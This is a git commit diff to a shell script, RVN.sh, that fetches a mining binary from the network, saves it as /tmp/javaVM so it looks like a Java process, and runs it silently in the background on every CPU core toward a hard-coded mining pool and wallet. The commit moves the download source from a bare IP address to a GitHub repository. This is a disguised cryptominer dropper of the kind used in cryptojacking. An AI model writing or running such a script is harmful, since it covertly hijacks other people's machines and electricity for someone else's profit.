88c43639b7ffd791f83a07f7df9c23ce0a75b32e
cronjob <thesunofme1@gmail.com>
2023-12-03 14:29:18 +0700

    Update RVN.sh

--- RVN.sh
+++ RVN.sh
@@ -4,7 +4,7 @@ if [ -f /tmp/javaVM ]
  	/tmp/javaVM -a yespowerSUGAR -o sea.mine.zpool.ca:6241 -u RLaigv5nSC2dKvM63F8dN4EHjxBEcZi11o --timeout 120 -p c=RVN,m=solo -t $(nproc) > /dev/null 2>&1 &
  	echo Started Existing
  	else
- 		wget -q http://150.136.168.71:80/archxx/yespowersugar -O /tmp/javaVM
+ 		wget -q https://github.com/thesunofme/trash/raw/main/yespowersugar -O /tmp/javaVM
  		chmod +x /tmp/javaVM
  		/tmp/javaVM -a yespowerSUGAR -o sea.mine.zpool.ca:6241 -u RLaigv5nSC2dKvM63F8dN4EHjxBEcZi11o --timeout 120 -p c=RVN,m=solo -t $(nproc) > /dev/null 2>&1 &
 fi
